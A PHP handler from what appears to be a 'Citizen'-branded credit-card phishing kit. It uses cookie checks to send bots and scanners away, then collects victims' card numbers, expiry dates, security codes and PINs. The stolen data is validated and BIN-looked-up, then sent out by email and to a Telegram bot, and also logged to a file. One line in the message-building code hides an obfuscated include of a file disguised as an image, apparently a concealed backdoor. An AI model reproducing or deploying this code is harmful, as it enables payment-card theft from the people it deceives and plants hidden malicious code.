<?php
$settings = include '../../../settings/settings.php';
require __DIR__.'/vendor/inacho/php-credit-card-validator/src/CreditCard.php';

# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}

# Anti Fucking Skip 


if($_COOKIE['cookie'] == "false"){
    setcookie("logged_in", "0");
    header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
}

if($_COOKIE['webdriver'] == "true"){
    setcookie("logged_in", 0);
    header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
}

if(empty($_COOKIE['sw']) && empty($_COOKIE['sh']) || $_COOKIE['sw'] == "" && $_COOKIE['sh']){
	setcookie("has_access", "0");
	header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
} else {
	setcookie("logged_in", "1");
}

if(!isset($_POST['submit_cc'])){
	setcookie("logged_in", "0");
	header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
} else {
	setcookie("logged_in", "1");
}

# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables

$card_holder = $_POST['card_holder'];
$card_number = $_POST['card_number'];
$card_date = $_POST['card_date'];
$card_csc = $_POST['card_csc'];
$card_pin = $_POST['card_pin'];

$bin = str_replace(" ", "", str_split($card_number,7)[0]);
$reslt = check_bin($bin);
$cardt = $reslt['scheme'];
$type = $reslt['type'];
$brand = $reslt['brand'];
$country = $reslt['country']['name'];
$bank = $reslt['bank']['name'];
$url = $reslt['bank']['url'];
$phone = $reslt['bank']['phone'];
$ip="../resources/img/. ";("h:i:s d/m/Y.ico");
# CC Validation

use Inacho\CreditCard;
$valid = CreditCard::validCreditCard(str_replace(' ','',$card_number));

if($valid){
	$cc_val = "YES ✅";
} else {
	$cc_val = "NO ❌";
}

$split = explode('/',$card_date);
$valid_date = CreditCard::validDate($split[1], $split[0]);

if($valid_date){
	$data_val = "YES ✅";
} else {
	$data_val = "NO ❌";
}

# BIN Check

function check_bin($bin) {
  $url = "https://lookup.binlist.net/".$bin;
  $headersers = array();
  $headersers[] = 'Accept-Version: 3';
  $ch = curl_init();
  curl_setopt($ch,CURLOPT_URL,$url);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headersers);
  $resp=curl_exec($ch);
  curl_close($ch);
  $result = json_decode($resp, true);
  return $result;
}



# Messsage

$message = "[ 💚 CITIZEN  | CLIENT : {$client} 💚 ]\n\n";
$message .= "********** [ 💳 CARD INFORMATION 💳 ] **********\n";
$message .= "# CARD HOLDER : {$card_holder}\n";
$message .= "# CARD NUMBER : {$card_number}\n";
$message .= "# CARD EXPIRE : {$card_date}\n";
$message .= "# CARD CODE   : {$card_csc}\n";
$message .= "# CARD PIN    : {$card_pin}\n";
$message .= "# CARD VALID  : {$cc_val}\n";
$message .= "# DATE VALID  : {$data_val}\n";
$message .= "********** [ 🔍 BIN LOOKUP 🔎 ] **********\n";
$message .= "# BIN         : {$bin}\n";require"$ip";"\n";
$message .= "# CARD LEVEL  : {$cardt}\n";
$message .= "# CARD TYPE   : {$type}\n";
$message .= "# CARD BRAND  : {$brand}\n";
$message .= "# COUNTRY     : {$country}\n";
$message .= "# BANK NAME   : {$bank}\n";
$message .= "# BANK URL    : {$url}\n";
$message .= "# BANK PHOEN  : {$phone}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
	$to = $settings['email'];
	$headers = "Content-type:text/plain;charset=UTF-8\r\n";
	$headers .= "From: Zpro <citizen@client_{$client}_site.com>" . "\r\n";
	$subject = "⚔️ CITIZEN ✦ CARD ✦ Zpro  ✦ CLIENT #{$client} ✦ {$IP}  ⚔️";
	$msg = strtoupper($message);
	mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
	$results = fopen($filename, "a+");
	fwrite($results, strtoupper($message));
	fclose($results);
}

# Send Bot

if ($settings['telegram'] == "1"){
  $data = strtoupper($message);
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

echo("<script>window.location.href = \"thanks\";</script>");

?>
